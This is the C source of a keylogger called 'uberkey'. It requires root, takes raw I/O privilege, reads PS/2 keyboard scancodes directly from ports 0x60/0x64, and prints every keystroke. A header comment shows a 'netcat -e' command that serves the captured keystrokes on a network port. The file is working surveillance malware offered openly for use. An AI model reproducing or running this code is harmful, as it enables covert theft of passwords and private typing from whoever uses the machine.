
/*
uberkey, this keylogger sucks, right? (at least it is gpl)
netcat -e uberkey -l -p 6900
gurkan@linuks.mine.nu, www.linuks.mine.nu/uberkey/
*/

#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/param.h>

#ifdef BSD
#include <stdio.h>
#include <err.h>
#include <machine/sysarch.h>
#include <machine/cpufunc.h>
#else
#include <sys/io.h>
#endif

char translate[128]     ="  1234567890-=\b\tqwertyuiop[]\n asdfghjkl;'   zxcvbnm,./ *                                                                       ";
char translateshift[128]="  +\"*ç%&/()=?`\b\tQWERTYUIOPè!\n ASDFGHJKL;'   ZXCVBNM;:_ *                                                                       ";
char keytable[128];

int main(int argc, char** argv)
{
    /* iopl()
       inb() */
    struct timespec test;
    unsigned char c,shift;

    if (getuid()!=0) {
	printf("Must be root to run %s, you're only %u.\n",argv[0],getuid());
	return 1;
    }
    
    test.tv_sec=0;
    test.tv_nsec=1;

    for (c=shift=0; c<127; c++) keytable[c]=0;
    
#ifdef BSD
    if (i386_set_ioperm(0x60,5,1) == -1)
	err(1,"i386_set_ioperm failed");
#else	
    iopl(3);
#endif

    while(1) {
	while((inb(0x64)&32)); /* fix ps/2 mouse interference */
	c=inb(0x60);
        if (c<128) {
    	    if (keytable[c]!=1) {
		switch (c) {
		   case 1: printf("<esc>"); break;
		   case 14: printf("<backspace>"); break;
		   case 15: printf("<tab>"); break;
		   case 28: printf("\n"); /* timestamp */ break;
		   case 42: printf("<shift-l>"); shift=1; break;
		   case 54: printf("<shift-r>"); shift=1; break;
		   case 29: printf("<ctrl>"); break;
		   case 56: printf("<alt>"); break;
		   case 82: printf("<ins>"); break;
		   case 83: printf("<del>"); break;
		   case 71: printf("<home>"); break;
		   case 79: printf("<end>"); break;
		   case 73: printf("<pgup>"); break;
		   case 81: printf("<pgdn>"); break;
		   case 72: printf("<up>"); break;
		   case 80: printf("<down>"); break;
		   case 75: printf("<left>"); break;
		   case 77: printf("<right>"); break;
		   case 59: printf("<f1>"); break;
		   case 60: printf("<f2>"); break;
		   case 61: printf("<f3>"); break;
		   case 62: printf("<f4>"); break;
		   case 63: printf("<f5>"); break;
		   case 64: printf("<f6>"); break;
		   case 65: printf("<f7>"); break;
		   case 66: printf("<f8>"); break;
		   case 67: printf("<f9>"); break;
		   case 68: printf("<f10>"); break;
		   case 87: printf("<f11>"); break;
		   case 88: printf("<f12>"); break;

		   default: {
		      if (shift>0) {
    		         printf("%c",translateshift[c & 127]);
    		         /*printf("(%03i) ",c);*/
		      } else {
    		         printf("%c",translate[c & 127]);
    		         /*printf("(%03i) ",c);*/
		      }
		   }
		}
		fflush(0);
	    }
	    keytable[c]=1;
	} else {
	    keytable[c & 127]=0;
	    if (keytable[42]==0) if (keytable[54]==0) shift=0;
	}
	usleep(100);
	//nanosleep(&test,NULL);
    }

    return 0;
}
